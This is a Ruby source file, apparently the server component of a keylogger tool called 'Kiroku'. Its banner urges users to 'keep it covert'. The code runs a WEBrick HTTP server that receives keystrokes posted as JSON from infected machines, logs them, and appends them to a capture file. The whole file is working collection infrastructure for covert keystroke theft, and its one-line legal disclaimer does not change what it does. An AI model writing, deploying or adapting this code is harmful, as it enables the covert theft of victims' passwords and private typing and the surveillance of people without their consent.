=begin
   ▄█   ▄█▄  ▄█     ▄████████  ▄██████▄     ▄█   ▄█▄ ███    █▄
  ███ ▄███▀ ███    ███    ███ ███    ███   ███ ▄███▀ ███    ███
  ███▐██▀   ███▌   ███    ███ ███    ███   ███▐██▀   ███    ███
 ▄█████▀    ███▌  ▄███▄▄▄▄██▀ ███    ███  ▄█████▀    ███    ███
▀▀█████▄    ███▌ ▀▀███▀▀▀▀▀   ███    ███ ▀▀█████▄    ███    ███
  ███▐██▄   ███  ▀███████████ ███    ███   ███▐██▄   ███    ███
  ███ ▀███▄ ███    ███    ███ ███    ███   ███ ▀███▄ ███    ███
  ███   ▀█▀ █▀     ███    ███  ▀██████▀    ███   ▀█▀ ████████▀  (Server)
  ▀                ███    ███              ▀
                                                   Zephyr

Pro Tip: Keep it clean, keep it covert. Always ensure your actions align with legal boundaries and ethical standards. Use responsibly, and stay sharp:>>
=end

require 'webrick'
require 'json'
require 'logger'

class MyServlet < WEBrick::HTTPServlet::AbstractServlet
  # Initialize the servlet with a logger and file path
  def initialize(server, file_path)
    super(server)
    @logger = Logger.new(STDOUT) # Log to standard output
    @logger.level = Logger::INFO # Set logging level to INFO
    @file_path = file_path # Path to the file where keystrokes will be saved
  end

  # Handle POST requests
  def do_POST(request, response)
    begin
      post_data = request.body
      data = JSON.parse(post_data)
      keyboard_data = data['keyboardData'] || ''
      @logger.info("Received Keystrokes: #{keyboard_data}") # Log received data
      save_capture_to_file(keyboard_data)
      response.status = 200
      response.content_type = 'application/json'
      response.body = { 'status' => 'success', 'message' => 'Data received and saved successfully' }.to_json
    rescue JSON::ParserError => e
      @logger.error("JSON parsing error: #{e.message}") # Log JSON parsing errors
      response.status = 400
      response.content_type = 'application/json'
      response.body = { 'status' => 'error', 'message' => 'Invalid JSON' }.to_json
    rescue StandardError => e
      @logger.error("Server error: #{e.message}") # Log other server errors
      response.status = 500
      response.content_type = 'application/json'
      response.body = { 'status' => 'error', 'message' => 'Internal server error' }.to_json
    end
  end

  # Save the captured keystrokes to a file
  def save_capture_to_file(data)
    File.open(@file_path, 'a') do |file|
      data.scan(/.{1,30}/).each do |line| # Split data into chunks of 30 characters
        file.puts(line)
      end
    end
  end
end

port = 8080 # Port number for the server (Change if needed)
file_path = 'saved_captures.txt' # File to save captured keystrokes (Change filename if needed)

logger = Logger.new(STDERR)
logger.level = Logger::INFO

# Create and start the WEBrick server
server = WEBrick::HTTPServer.new :Port => port, :Logger => logger, :AccessLog => []
server.mount '/', MyServlet, file_path # Mount the custom servlet

trap  'INT' do
  logger.info("Shutting down server...") # Log shutdown 
  server.shutdown # Shut the server down
end

server.start # Initialize the server
